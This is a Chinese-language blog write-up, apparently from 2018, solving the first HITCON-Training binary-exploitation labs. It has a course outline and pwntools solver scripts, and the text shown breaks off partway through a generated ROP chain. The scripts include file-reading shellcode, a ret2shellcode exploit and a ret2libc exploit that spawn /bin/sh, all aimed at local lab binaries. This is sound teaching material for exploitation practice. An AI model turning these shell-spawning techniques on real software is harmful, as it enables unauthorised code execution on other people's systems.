<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>HITCON-Training-Writeup - localhost - Done with development, it&#39;s time to pwn.</title>
  

<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta name="MobileOptimized" content="width"/>
<meta name="HandheldFriendly" content="true"/>


<meta name="applicable-device" content="pc,mobile">

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">

<meta name="mobile-web-app-capable" content="yes">

<meta name="author" content="M4x" />
  <meta name="description" content="HITCON-Training-Writeup 项目地址M4x&amp;rsquo;s github，欢迎 star~ 复习一下二进制基础，写写 HITCON-Training 的 writeup，题目地址：https://github.co" />







<meta name="generator" content="Hugo 0.68.3" />


<link rel="canonical" href="https://bash-c.github.io/post/hitcon-training-writeup/" />





<link rel="icon" href="/favicon.ico" />











<link rel="stylesheet" href="/sass/jane.min.f1e506a781bf25d33ffc18aa6b4e972a965c58049d27d4f92b7db2e9bf28e4bf.css" integrity="sha256-8eUGp4G/JdM//Biqa06XKpZcWASdJ9T5K32y6b8o5L8=" media="screen" crossorigin="anonymous">





<meta property="og:title" content="HITCON-Training-Writeup" />
<meta property="og:description" content="HITCON-Training-Writeup 项目地址M4x&rsquo;s github，欢迎 star~ 复习一下二进制基础，写写 HITCON-Training 的 writeup，题目地址：https://github.co" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bash-c.github.io/post/hitcon-training-writeup/" />
<meta property="article:published_time" content="2018-07-02T12:05:10+08:00" />
<meta property="article:modified_time" content="2018-07-02T12:05:10+08:00" />
<meta itemprop="name" content="HITCON-Training-Writeup">
<meta itemprop="description" content="HITCON-Training-Writeup 项目地址M4x&rsquo;s github，欢迎 star~ 复习一下二进制基础，写写 HITCON-Training 的 writeup，题目地址：https://github.co">
<meta itemprop="datePublished" content="2018-07-02T12:05:10&#43;08:00" />
<meta itemprop="dateModified" content="2018-07-02T12:05:10&#43;08:00" />
<meta itemprop="wordCount" content="9733">



<meta itemprop="keywords" content="HITCON-Training,pwn,reverse," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HITCON-Training-Writeup"/>
<meta name="twitter:description" content="HITCON-Training-Writeup 项目地址M4x&rsquo;s github，欢迎 star~ 复习一下二进制基础，写写 HITCON-Training 的 writeup，题目地址：https://github.co"/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->




</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo"># </a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/">cd ~</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/post/">ls -l /post</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/tags/">less /tags</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/categories/">tree /categories</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/link/">ping friends</a>
          
        
      </li><li class="mobile-menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/aboutme/">whoami</a>
          
        
      </li>
    

    
  </ul>
</nav>


  
    






  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />




<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>

  

  

  

  <header id="header" class="header container">
    <div class="logo-wrapper">
  <a href="/" class="logo">
    
      # 
    
  </a>
</div>

<nav class="site-navbar">
  <ul id="menu" class="menu">
    
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/">cd ~</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/post/">ls -l /post</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/tags/">less /tags</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/categories/">tree /categories</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/link/">ping friends</a>
          

        

      </li>
    
        <li class="menu-item">
        
          
          
            <a class="menu-item-link" href="https://bash-c.github.io/aboutme/">whoami</a>
          

        

      </li>
    

    
    

    
  </ul>
</nav>

  </header>

  <div id="mobile-panel">
    <main id="main" class="main bg-llight">
      <div class="content-wrapper">
        <div id="content" class="content container">
          <article class="post bg-white">
    
    <header class="post-header">
      <h1 class="post-title">HITCON-Training-Writeup</h1>
      
      <div class="post-meta">
        <time datetime="2018-07-02" class="post-time">
          2018-07-02
        </time>
        <div class="post-category">
            <a href="https://bash-c.github.io/categories/writeup/"> writeup </a>
            
          </div>
        <span class="more-meta"> 9733 words </span>
          <span class="more-meta"> 20 min read </span>

        
        
          <span id="busuanzi_container_page_pv">
            | 阅读 <span id="busuanzi_value_page_pv"></span>
          </span>
        

        
        
      </div>
    </header>

    
    
<div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">Table of Contents</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#outline">Outline</a></li>
    <li><a href="#writeup">Writeup</a>
      <ul>
        <li><a href="#lab1-sysmagic">lab1-sysmagic</a></li>
        <li><a href="#lab2-orwbin">lab2-orw.bin</a></li>
        <li><a href="#lab3-ret2sc">lab3-ret2sc</a></li>
        <li><a href="#lab4-ret2lib">lab4-ret2lib</a></li>
        <li><a href="#lab5-simplerop">lab5-simplerop</a></li>
        <li><a href="#lab6-migration">lab6-migration</a></li>
        <li><a href="#lab7-crack">lab7-crack</a></li>
        <li><a href="#lab8-craxme">lab8-craxme</a></li>
        <li><a href="#lab9-playfmt">lab9-playfmt</a></li>
        <li><a href="#lab10-hacknote">lab10-hacknote</a></li>
        <li><a href="#lab11-bamboobox">lab11-bamboobox</a></li>
        <li><a href="#lab12-secretgarden">lab12-secretgarden</a></li>
        <li><a href="#lab13-heapcreator">lab13-heapcreator</a></li>
        <li><a href="#lab14-magicheap">lab14-magicheap</a></li>
        <li><a href="#lab15-zoo">lab15-zoo</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>

    
    <div class="post-content">
      <h1 id="hitcon-training-writeup">HITCON-Training-Writeup</h1>
<blockquote>
<p>项目地址<a href="https://github.com/bash-c/HITCON-Training-Writeup">M4x&rsquo;s github</a>，欢迎 star~</p>
</blockquote>
<p>复习一下二进制基础，写写 HITCON-Training 的 writeup，题目地址：https://github.com/scwuaptx/HITCON-Training</p>
<h2 id="outline">Outline</h2>
<ul>
<li>Basic Knowledge
<ul>
<li>Introduction
<ul>
<li>Reverse Engineering
<ul>
<li>Static Analysis</li>
<li>Dynamic Analysis</li>
</ul>
</li>
<li>Exploitation</li>
<li>Useful Tool
<ul>
<li>IDA PRO</li>
<li>GDB</li>
<li>Pwntool</li>
</ul>
</li>
<li>lab 1 - sysmagic</li>
</ul>
</li>
<li>Section</li>
<li>Compile,linking,assmbler</li>
<li>Execution
<ul>
<li>how program get run</li>
<li>Segment</li>
</ul>
</li>
<li>x86 assembly
<ul>
<li>Calling convention</li>
<li>lab 2 - open/read/write</li>
<li>shellcoding</li>
</ul>
</li>
</ul>
</li>
<li>Stack Overflow
<ul>
<li>Buffer Overflow</li>
<li>Return to Text/Shellcode
<ul>
<li>lab 3 - ret2shellcode</li>
</ul>
</li>
<li>Protection
<ul>
<li>ASLR/DEP/PIE/StackGuard</li>
</ul>
</li>
<li>Lazy binding</li>
<li>Return to Library
<ul>
<li>lab 4 - ret2lib</li>
</ul>
</li>
</ul>
</li>
<li>Return Oriented Programming
<ul>
<li>ROP
<ul>
<li>lab 5 - simple rop</li>
</ul>
</li>
<li>Using ROP bypass ASLR
<ul>
<li>ret2plt</li>
</ul>
</li>
<li>Stack migration
<ul>
<li>lab 6 - migration</li>
</ul>
</li>
</ul>
</li>
<li>Format String Attack
<ul>
<li>Format String</li>
<li>Read from arbitrary memory
<ul>
<li>lab 7 - crack</li>
</ul>
</li>
<li>Write to arbitrary memory
<ul>
<li>lab 8 - craxme</li>
</ul>
</li>
<li>Advanced Trick
<ul>
<li>EBP chain</li>
<li>lab 9 - playfmt</li>
</ul>
</li>
</ul>
</li>
<li>x64 Binary Exploitation
<ul>
<li>x64 assembly</li>
<li>ROP</li>
<li>Format string Attack</li>
</ul>
</li>
<li>Heap exploitation
<ul>
<li>Glibc memory allocator overview</li>
<li>Vulnerablility on heap
<ul>
<li>Use after free
<ul>
<li>lab 10 - hacknote</li>
</ul>
</li>
<li>Heap overflow
<ul>
<li>house of force
<ul>
<li>lab 11 - 1 - bamboobox1</li>
</ul>
</li>
<li>unlink
<ul>
<li>lab 11 - 2 - bamboobox2</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Advanced heap exploitation
<ul>
<li>Fastbin attack
<ul>
<li>lab 12 - babysecretgarden</li>
</ul>
</li>
<li>Shrink the chunk</li>
<li>Extend the chunk
<ul>
<li>lab 13 - heapcreator</li>
</ul>
</li>
<li>Unsortbin attack
<ul>
<li>lab 14 - magicheap</li>
</ul>
</li>
</ul>
</li>
<li>C++ Exploitation
<ul>
<li>Name Mangling</li>
<li>Vtable fucntion table</li>
<li>Vector &amp; String</li>
<li>New &amp; delete</li>
<li>Copy constructor &amp; assignment operator
<ul>
<li>lab 15 - zoo</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="writeup">Writeup</h2>
<h3 id="lab1-sysmagic">lab1-sysmagic</h3>
<p>一个很简单的逆向题，看 get_flag 函数的逻辑逆回来即可，直接逆向的方法就不说了</p>
<p>或者经过观察，flag 的生成与输入无关，因此可以通过 patch 或者调试直接获得 flag</p>
<h4 id="patch">patch</h4>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpmdngq8j30ja047dg7.jpg" alt=""></p>
<p>修改关键判断即可，patch 后保存运行，输入任意值即可得 flag</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpmkyf79j30ez03emxy.jpg" alt=""></p>
<h4 id="调试">调试</h4>
<p>通过观察汇编，我们只需使下图的 cmp 满足即可，可以通过 gdb 调试，在调试过程中手动满足该条件</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpngmh9cj30f904gdfx.jpg" alt=""></p>
<p>直接写出 gdb 脚本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">lab1 <span class="o">[</span>master●●<span class="o">]</span> cat solve 
b *get_flag+389
r
<span class="c1">#your input</span>
<span class="nb">set</span> <span class="nv">$eax</span><span class="o">=</span><span class="nv">$edx</span>
c
lab1 <span class="o">[</span>master●●<span class="o">]</span> 
</code></pre></td></tr></table>
</div>
</div><p>也可得到 flag</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpmxbneij30qu0c5dll.jpg" alt=""></p>
<p>同时注意，IDA 对字符串的识别出了问题，修复方法可以参考 inndy 的 <a href="http://www.cnblogs.com/WangAoBo/p/7706719.html"><strong>ROP2</strong></a></p>
<h3 id="lab2-orwbin">lab2-orw.bin</h3>
<p>通过查看 prctl 的 man 手册发现该程序限制了一部分系统调用，根据题目的名字 open, read, write以及IDA分析，很明显是要我们自己写读取并打印 flag 的 shellcode 了，偷个懒，直接调用 shellcraft 模块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab2</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
<span class="c1">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">shellcraft</span> <span class="k">as</span> <span class="n">sc</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="n">sc</span><span class="o">.</span><span class="n">pushstr</span><span class="p">(</span><span class="s2">&#34;/home/m4x/HITCON-Training/LAB/lab2/testFlag&#34;</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">sc</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;esp&#34;</span><span class="p">)</span>
<span class="c1">#  open返回的文件文件描述符存贮在eax寄存器里 </span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">sc</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s2">&#34;eax&#34;</span><span class="p">,</span> <span class="s2">&#34;esp&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="c1">#  open读取的内容放在栈顶 </span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">sc</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;esp&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./orw.bin&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;shellcode:&#34;</span><span class="p">,</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="k">print</span> <span class="n">io</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">lab2</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> 
</code></pre></td></tr></table>
</div>
</div><p>该题与 pwnable.tw 的 orw 类似，那道题的 writeup 很多，因此就不说直接撸汇编的方法了</p>
<h3 id="lab3-ret2sc">lab3-ret2sc</h3>
<p>很简单的 ret2shellcode，程序没有开启 NX 和 canary 保护，把 shellcode 存贮在 name 这个全局变量上，并 ret 到该地址即可</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab3</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
<span class="c1">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="p">(</span><span class="n">os</span> <span class="o">=</span> <span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;i386&#34;</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2sc&#34;</span><span class="p">)</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span> <span class="mh">0x804a060</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">lab3</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> 
</code></pre></td></tr></table>
</div>
</div><p>需要注意的是，该程序中的 read 是通过 esp 寻址的，因此具体的 offset 可以通过调试查看</p>
<p><img src="http://ww1.sinaimg.cn/large/006AWYXBly1fpcpljuki5j30g702wdfy.jpg" alt=""></p>
<p>也可以通过 peda 的 pattern_offset/pattern_search , pwntools 的 cyclic/cyclic -l 等工具来找 offset</p>
<h3 id="lab4-ret2lib">lab4-ret2lib</h3>
<p>ret2libc，并且程序中已经有了一个可以查看 got 表中值的函数 See_something，直接 leak 出 libc 基址，通过 one_gadget 或者 system(&quot;/bin/sh&rdquo;) 都可以 get shell，/bin/sh 可以使用 libc 中的字符串，可以通过 read 读入到内存中，也可以使用 binary 中的字符串</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">lab4</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">solve</span><span class="o">.</span><span class="n">py</span> 
<span class="c1">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__Auther__</span> <span class="o">=</span> <span class="s1">&#39;M4x&#39;</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ret2lib&#34;</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ret2lib&#34;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/lib/i386-linux-gnu/libc.so.6&#34;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]))</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34; : &#34;</span><span class="p">)</span>
<span class="n">libcBase</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">drop</span> <span class="o">=</span> <span class="bp">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;puts&#34;</span><span class="p">]</span>

<span class="n">success</span><span class="p">(</span><span class="s2">&#34;libcBase -&gt; {:#x}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">libcBase</span><span class="p">))</span>
<span class="c1">#  oneGadget = libcBase + 0x3a9fc</span>

<span class="c1">#  payload = flat(cyclic(60), oneGadget)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">60</span><span class="p">),</span> <span class="n">libcBase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">],</span> <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">&#34;sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34; :&#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">lab4</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> 
</code></pre></td></tr></table>
</div>
</div><h3 id="lab5-simplerop">lab5-simplerop</h3>
<p>本来看程序是静态链接的，想通过 ROPgadget/ropper 等工具生成的 ropchain 一波带走，但实际操作时发现 read 函数只允许读入 100 个字符，去除 buf 到 main 函数返回地址的偏移为 32，我们一共有 100 - 32 = 68 的长度来构造 ropchain，而 ropper/ROPgadget 等自动生成的 ropchain 都大于这个长度，这就需要我们精心设计 ropchain 了，这里偷个懒，优化一下 ropper 生成的 ropchain 来缩短长度</p>
<blockquote>
<p>ropper &ndash;file ./simplerop &ndash;chain &ldquo;execve cmd=/bin/sh&rdquo;</p>
<p>ROPgadget &ndash;binary ./simplerop &ndash;ropchain</p>
</blockquote>
<p>先看一下 ropper 生成的 ropchain</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># Generated by ropper ropchain generator #</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="n">p</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;I&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>

<span class="n">IMAGE_BASE_0</span> <span class="o">=</span> <span class="mh">0x08048000</span> <span class="c1"># ./simplerop</span>
<span class="n">rebase_0</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">p</span><span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">IMAGE_BASE_0</span><span class="p">)</span>

<span class="n">rop</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>

<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00072e06</span><span class="p">)</span> <span class="c1"># 0x080bae06: pop eax; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="s1">&#39;//bi&#39;</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0002682a</span><span class="p">)</span> <span class="c1"># 0x0806e82a: pop edx; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000a3060</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0005215d</span><span class="p">)</span> <span class="c1"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00072e06</span><span class="p">)</span> <span class="c1"># 0x080bae06: pop eax; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="s1">&#39;n/sh&#39;</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0002682a</span><span class="p">)</span> <span class="c1"># 0x0806e82a: pop edx; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000a3064</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0005215d</span><span class="p">)</span> <span class="c1"># 0x0809a15d: mov dword ptr [edx], eax; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x00072e06</span><span class="p">)</span> <span class="c1"># 0x080bae06: pop eax; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x0002682a</span><span class="p">)</span> <span class="c1"># 0x0806e82a: pop edx; ret; </span>
<span class="n">rop</span> <span class="o">+=</span> <span class="n">rebase_0</span><span class="p">(</span><span class="mh">0x000a3068</span><span class="p">)</span>
